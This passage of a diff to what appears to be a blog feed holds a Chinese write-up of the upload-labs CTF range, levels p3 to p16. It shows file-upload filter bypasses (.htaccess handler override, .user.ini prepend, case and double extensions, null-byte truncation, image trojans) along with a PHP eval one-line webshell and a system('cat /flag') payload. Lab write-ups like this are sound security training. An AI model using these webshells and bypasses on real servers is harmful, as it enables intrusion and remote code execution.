+&lt;li&gt;发现成功上传，复制上传文件的路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191924.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用菜刀连接，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192029.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;找到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705200725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{5b323cff}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p3&#34;&gt;上传实验室-p3&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;首先我们看源码，发现很多办法都失效了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192130.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那么我们尝试用&lt;code&gt;php3&lt;/code&gt;试试，发现成功上传，然后复制上传文件路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192247.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;连接菜刀，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192425.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查看flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192625.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{22e47e94}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p4&#34;&gt;上传实验室-p4&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;首先我们看源码，发现很多办法都失效了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192657.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;但是&lt;code&gt;.htaccess&lt;/code&gt;没有被过滤，那么我们先传个&lt;code&gt;.htaccess&lt;/code&gt;文件上去，然后再让它自动修改我的图片文件为&lt;code&gt;php&lt;/code&gt;文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;构造&lt;code&gt;.htaccess&lt;/code&gt;如下：&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;FilesMatch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.jpg&amp;#34;&lt;/span&gt;&amp;gt;
+SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;然后我们上传该文件后，继续上传&lt;code&gt;1.php&lt;/code&gt;更改后缀后的&lt;code&gt;1.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1.jpg&lt;/code&gt;上传成功后，复制上传文件后的链接，链接菜刀，发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705200618.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192901.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{acc5bcdd}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p5&#34;&gt;上传实验室-p5&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;直接看源码，一开始感觉到这个源码几乎是无懈可击&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705192942.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;经过很多很多很多很多很多很多很多次实验以及反复观察源码&lt;/strong&gt;，发现&lt;code&gt;php7&lt;/code&gt;没有被判断，同时查找资料发现配置文件&lt;code&gt;ini&lt;/code&gt;可以使用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;关于&lt;code&gt;.user.ini&lt;/code&gt;文件的解释，我们可以好好地看p师傅之前写的文章&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html&#34;&gt;https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;总体来说，就是我们可以通过&lt;code&gt;.usr.ini&lt;/code&gt;轻松地让所有&lt;code&gt;php&lt;/code&gt;文件都自动包含某个文件，而这个文件可以是一个正常的&lt;code&gt;php&lt;/code&gt;文件，也可以是一个包含一句话木马的&lt;code&gt;webshell&lt;/code&gt;。也就是我们接下来要上传进去的&lt;code&gt;.gif&lt;/code&gt;文件一句话木马&lt;/li&gt;
+&lt;li&gt;我们首先新建一个&lt;code&gt;.usr.ini&lt;/code&gt;文件，内容如下：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;auto_prepend_file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;five.gif
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;再新建一个&lt;code&gt;five.gif&lt;/code&gt;文件，内容如下：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;?php @eval&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$_POST&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mao&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;;?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;然后将这两个文件都上传至靶场中&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193048.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;然后静静等待一下，尝试连接菜刀，连接成功&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193138.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;，并查看&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193231.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193312.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{1407893c}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p6&#34;&gt;上传实验室-p6&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;直接查看源码，发现一堆过滤&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193336.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现没有对大小写进行判断，那么我们直接切换大小写上传文件，并使用burp抓包改包&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193431.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;上传成功，并右键复制上传文件路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193456.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;连接菜刀&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193550.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查到flag，并查看flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193635.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{73ff7959}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p11&#34;&gt;上传实验室-p11&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;直接查看源码，发现变量&lt;code&gt;$deny_ext&lt;/code&gt;只替换一次&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193654.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那么我们可以考虑双写后缀看看行不行，构造一句话木马文件，名为&lt;code&gt;2.pphphp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;然后上传文件，上传成功，右键复制文件路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193727.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;连接菜刀&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193824.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;找到flag文件，并发现flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193909.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{0bdd5600}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p12&#34;&gt;上传实验室-p12&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;直接源码审计，发现是白名单过滤，并且直接拼接本地图片路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705193927.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;上传改成如上图所示三个图片后缀的木马文件，然后使用burp抓包操作，发现两个路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194206.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;然后我们使用&lt;code&gt;%00&lt;/code&gt;进行截断，截断的原理是什么呢？
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%00&lt;/code&gt;的作用类似于C语言中的&lt;code&gt;\0&lt;/code&gt;结束符，后面的不读&lt;/li&gt;
+&lt;li&gt;如上图所示，如果我们使用&lt;code&gt;1.jpg&lt;/code&gt;进行上传，如果没有问题，上传后的文件所在路径就自动拼接为&lt;code&gt;/upload/1.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;然而&lt;code&gt;jpg&lt;/code&gt;文件不能使我们运行木马，我们需要使用截断的方式构造&lt;code&gt;1.php&lt;/code&gt;文件，并使得后面的&lt;code&gt;1.jpg&lt;/code&gt;失效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194332.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件上传成功，右键复制路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194431.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;上面复制的文件路径为&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://47.103.137.68:7153/upload/1.php%EF%BF%BD/5220200702193403.jpg
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;去掉&lt;code&gt;%&lt;/code&gt;开始的内容，使用菜刀连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194523.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现flag文件，找到flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194628.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{df66cb42}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p13&#34;&gt;上传实验室-p13&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;首先源码审计，发现和上一道题好像没有什么不同&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194655.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那我们接着传文件，抓包看看有什么不同，发现这次两个路径都是&lt;code&gt;post&lt;/code&gt;传过去的&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194803.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那么我们依旧使用截断，这里的不同就是，&lt;code&gt;post&lt;/code&gt;不能像&lt;code&gt;ge&lt;/code&gt;t一样对&lt;code&gt;%00&lt;/code&gt;进行解码，我们直接在&lt;code&gt;hex&lt;/code&gt;中修改截断为&lt;code&gt;00&lt;/code&gt;，如下图所示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194856.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;以及下图&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;修改完毕&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;放包，发现上传成功，右键复制路径&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195130.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;路径如下&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://47.103.137.68:7047/upload/1.php%EF%BF%BD/5220200702195130.jpg
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;去掉&lt;code&gt;%&lt;/code&gt;及后面内容，连接菜刀成功&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195229.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;文件，找到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195338.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{0c369020}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p14&#34;&gt;上传实验室-p14&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;首先源代码审计，发现是很正常的文件类型判断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195401.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;同时题目有提示上传图片马&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195424.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那么我们先制作图片马&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;copy 1.png/b + 1.php/a 2.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;制作完毕后，发现是一页乱码和我们上传的图片，试了很多文件包含，发现无果&lt;/li&gt;
+&lt;li&gt;经过很久的尝试，我还是决定在图片马中写入&lt;code&gt;phpinfo()&lt;/code&gt;函数，看看有什么反应，发现首页就进行了响应&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195452.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;那么我们就要思考了，所谓的文件包含是不是已经实现了呢，而我们直接利用插入的&lt;code&gt;php&lt;/code&gt;代码即可&lt;/li&gt;
+&lt;li&gt;于是修改&lt;code&gt;php&lt;/code&gt;代码为&lt;code&gt;&amp;lt;?php system(&#39;cat /flag&#39;);?&amp;gt;&lt;/code&gt;，再次上传图片马看看&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195515.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{9af4ddc1}&lt;/p&gt;
+&lt;p&gt;虽然&lt;code&gt;wp&lt;/code&gt;写的简单，但试了真的非常非常非常非常非常多次&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p15&#34;&gt;上传实验室-p15&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;发现首页提示一样&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195550.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;源码审计发现也是判断文件类型&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;直接上传刚才做好的图片马，发现读出了flag&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195621.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{7267acf0}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p16&#34;&gt;上传实验室-p16&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;和上一道题一样，发现首页也一样&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195653.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现源代码也是判断文件类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195722.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;直接上传图片马试试看，发现&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195804.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{16f60bb2}&lt;/p&gt;
+&lt;/blockquote&gt;
+- https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/ - This is a customized copyright.</description>
         </item>
     
     
